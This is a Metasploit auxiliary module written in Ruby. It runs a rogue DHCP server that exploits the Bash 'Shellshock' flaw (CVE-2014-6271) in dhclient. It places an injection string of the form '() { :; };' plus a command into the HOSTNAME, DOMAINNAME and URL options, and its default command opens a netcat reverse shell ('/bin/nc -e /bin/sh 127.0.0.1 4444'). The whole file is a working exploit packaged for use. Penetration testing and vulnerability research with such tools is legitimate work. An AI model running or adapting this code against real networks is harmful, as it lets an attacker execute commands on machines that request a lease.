##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/dhcp'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DHCPServer

  def initialize
    super(
      'Name'        => 'DHCP Client Bash Environment Variable Code Injection',
      'Description'    => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting dhclient network configuration
        scripts through the HOSTNAME, DOMAINNAME, and URL DHCP options.
      },
      'Author'      =>
        [
          'scriptjunkie', 'apconole[at]yahoo.com', # Original DHCP Server auxiliary module
          'Stephane Chazelas', # Vulnerability discovery
          'Ramon de C Valle' # This module
        ],
      'License' => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'References' => [
        ['CVE', '2014-6271'],
        ['CWE', '94'],
        ['OSVDB', '112004'],
        ['EDB', '34765'],
        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649',],
        ['URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/',]
      ],
      'DisclosureDate' => 'Sep 24 2014'
    )

    register_options(
      [
        OptString.new('CMD', [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
      ], self.class)

    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
  end

  def run
    value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"

    hash = datastore.copy
    hash['DOMAINNAME'] = value
    hash['HOSTNAME'] = value
    hash['URL'] = value

    # This loop is required because the current DHCP Server exits after the
    # first interaction.
    loop do
      begin
        start_service(hash)

        while @dhcp.thread.alive?
          select(nil, nil, nil, 2)
        end

      rescue Interrupt
        break

      ensure
        stop_service
      end
    end
  end

end
